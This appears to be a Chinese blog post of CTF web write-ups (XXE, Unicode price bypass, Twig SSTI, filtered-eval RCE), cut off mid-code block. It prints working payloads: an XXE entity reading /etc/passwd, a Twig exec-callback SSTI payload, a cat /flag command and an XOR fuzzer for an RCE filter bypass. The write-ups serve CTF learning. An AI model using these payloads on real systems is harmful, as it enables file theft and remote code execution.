&lt;/h1&gt;&lt;hr&gt;
&lt;h1 id="nctf2019fake-xml-cookbook"&gt;[NCTF2019]Fake XML cookbook
&lt;/h1&gt;&lt;p&gt;根据题目是XML，首先想到是XXE，虽然咱没学过但是可以去搜简单的payload。&lt;/p&gt;
&lt;p&gt;使用bp抓个包，POST中传入的是标签格式，可以确定是XXE类型的题目&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST
Content-Type: application/xml;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;1&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;2&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;去摸一个payload试试&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-8&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE test [
&amp;lt;!ENTITY admin SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;
]&amp;gt;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;admin;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功读取文件&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302110439.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;把路径改为/flag，获得flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="asis-2019unicorn-shop"&gt;[ASIS 2019]Unicorn shop
&lt;/h1&gt;&lt;p&gt;这道题绝活。学到了unicode的安全问题：&lt;a class="link" href="https://xz.aliyun.com/t/5402" target="_blank" rel="noopener"
&gt;浅谈Unicode设计的安全性&lt;/a&gt;，看了wp。&lt;/p&gt;
&lt;p&gt;进入网站一个本杰明·富兰克林至理名言：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;金钱从来不会使人幸福，也不会使人幸福；它的本性中没有任何东西可以产生幸福。幸福拥有的越多，想要的就越多&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;del&gt;差点信了，我就要赚钱花(小声bb)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;下面两个输入框，一个ID一个钱，上面一个独角兽商品列表，一看就是让买东西，但是1-3商品输入ID都提示错误，只有第四个可以买到，但是第四个输入钱的时候只能输入1位，然鹅4号价格是1377，显然买不到，输入多个又提示 ，所以思路就是找一个unicode字符，它的数字格式值是大于1377的。&lt;/p&gt;
&lt;p&gt;一个和unicode有关的网站：https://www.compart.com/en/unicode&lt;/p&gt;
&lt;p&gt;网站导航栏找到Character Categories分类，这个下有三个和数相关的：Decimal Number、Letter Number、Other Number，第一个里面都是正常数值的unicode，建议去后面两个找。怎么找：&lt;code&gt;Ctrl+F&lt;/code&gt;搜索thousand，找1377以上的都可。&lt;/p&gt;
&lt;p&gt;我选的是这个&lt;code&gt;፼&lt;/code&gt;数值是1w，直接传传不过去，使用url编码一次再传。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302113544.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020cookie-is-so-stable"&gt;[BJDCTF2020]Cookie is so stable
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210304092035.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;这道题和The mystery of ip的网站一样，还有可能是ssti，hint.php的注释里有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Why not take a closer look at cookies?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;去flag.php提交个1之后，看cookie为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Cookie: PHPSESSID=dba9ac7cbddf1983cbac508b01f8cdf2; user=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一目了然，接下来就是找payload。再使用之前的&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{system(&amp;#39;cat /flag&amp;#39;)}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;被拦下来了，说明加强了过滤。在这之后去看了wp，网上的wp都是直接给出了payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{{_self.env.registerUndefinedFilterCallback(&amp;#34;exec&amp;#34;)}}{{_self.env.getFilter(&amp;#34;whoami&amp;#34;)}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我是受了这位师傅的&lt;a class="link" href="https://www.cnblogs.com/bmjoker/p/13508538.html" target="_blank" rel="noopener"
&gt;文章&lt;/a&gt;启发，又去结合了下这道题的&lt;a class="link" href="https://github.com/BjdsecCA/BJDCTF2020_January/tree/f73ac63336d9161d3c91354ce3eac943c403d4fb/Web/ssti_twig" target="_blank" rel="noopener"
&gt;源码&lt;/a&gt;才搞明白。&lt;/p&gt;
&lt;p&gt;这道题在渲染之前使用了twig模板：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;我同样在题目的源码中找到了&lt;code&gt;render()&lt;/code&gt;方法和&lt;code&gt;Twig_Environment&lt;/code&gt;配置信息&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302160322.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;然后payload的具体原理在的&lt;code&gt;Environment.php&lt;/code&gt;中,贴一下和payload相关部分：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302160722.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先执行&lt;code&gt;{{_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)}}&lt;/code&gt;调用了&lt;code&gt;registerUndefinedFilterCallback()&lt;/code&gt;函数(图中884行)，注册了一个未定义的函数到&lt;code&gt;filterCallbacks&lt;/code&gt;全局变量中&lt;/li&gt;
&lt;li&gt;接着执行&lt;code&gt;{{_self.env.getFilter(&amp;quot;whoami&amp;quot;)}}&lt;/code&gt;调用了&lt;code&gt;getFilter()&lt;/code&gt;函数，并传入变量&lt;code&gt;$name&lt;/code&gt;值为执行的命令，当函数执行到图中代码875行时，进入循环执行了&lt;code&gt;call_user_func()&lt;/code&gt;，这个函数大伙肯定不陌生：call_user_func 可以把第一个参数作为回调函数调用，调用的参数来源就是第一步中注册的&lt;code&gt;filterCallbacks&lt;/code&gt;全局变量，里边已经躺好了一个刚刚注册的&lt;code&gt;exec&lt;/code&gt;，至此就形成了payload&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h1 id="小彩蛋"&gt;小彩蛋
&lt;/h1&gt;&lt;p&gt;现在(2021年3月2日16:32:44)刚好做完题，想回到BUU上整理过程，发现502了，然后去群里就看到了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302163452.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210302163636.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;挺草的记一下。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="ciscn-2019-初赛love-math"&gt;[CISCN 2019 初赛]Love Math
&lt;/h1&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;error_reporting&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//听说你很喜欢数学，不知道你是否爱它胜过爱flag
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;show_source&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//例子 c=20-1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $content &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($content) &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;80&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;太长了不会算&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $blacklist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39; &amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\t&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;`&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\[&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\]&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;foreach&lt;/span&gt; ($blacklist &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; $blackitem) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; $blackitem &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/m&amp;#39;&lt;/span&gt;, $content)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;请不要输入奇奇怪怪的字符&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; $whitelist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;abs&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan2&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atanh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;base_convert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;bindec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;ceil&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decbin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;dechex&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decoct&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;deg2rad&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;expm1&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;floor&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;fmod&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hexdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hypot&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_finite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_infinite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_nan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;lcg_value&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log10&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log1p&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;min&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;octdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pi&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pow&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rad2deg&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;round&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sqrt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tanh&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;preg_match_all&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&amp;#39;&lt;/span&gt;, $content, $used_funcs);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;foreach&lt;/span&gt; ($used_funcs[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;] &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; $func) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($func, $whitelist)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;请不要输入奇奇怪怪的函数&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;//帮你算出答案
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;eval&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;echo &amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$content&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;;&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;快被搞死了，是一道有过滤限制的RCE，半天没有头绪就去看wp了。&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.cnblogs.com/20175211lyz/p/11588219.html" target="_blank" rel="noopener"
&gt;刷题记录：[CISCN 2019 初赛]Love Math&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最后自己琢磨出来了一个payload，思路当然还是参考上面师傅博客的。&lt;/p&gt;
&lt;p&gt;利用&lt;code&gt;$whitelist&lt;/code&gt;里的函数名称和数字遍历异或&lt;code&gt;^&lt;/code&gt;，Fuzz找出来需要的字母，然后拼接一个&lt;code&gt;_GET&lt;/code&gt;传参执行命令。&lt;/p&gt;
&lt;p&gt;Fuzz的代码&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$whitelist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;abs&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan2&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atanh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;base_convert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;bindec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;ceil&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decbin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;dechex&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decoct&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;deg2rad&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;expm1&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;floor&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;fmod&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hexdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hypot&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_finite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_infinite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_nan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;lcg_value&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log10&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log1p&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;min&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;octdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pi&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pow&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rad2deg&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;round&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sqrt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tanh&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$exp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; ($i&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $i &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;count&lt;/span&gt;($whitelist); $i&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; ($j&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $j &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;; $j&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $exp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$whitelist[$i]&lt;span style="color:#f92672"&gt;^&lt;/span&gt;$j&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $whitelist[$i]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;^&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$j&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;----&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$exp;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要知道的有，php某个版本以后可以使用函数名加&lt;code&gt;()&lt;/code&gt;的方式调用函数，如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
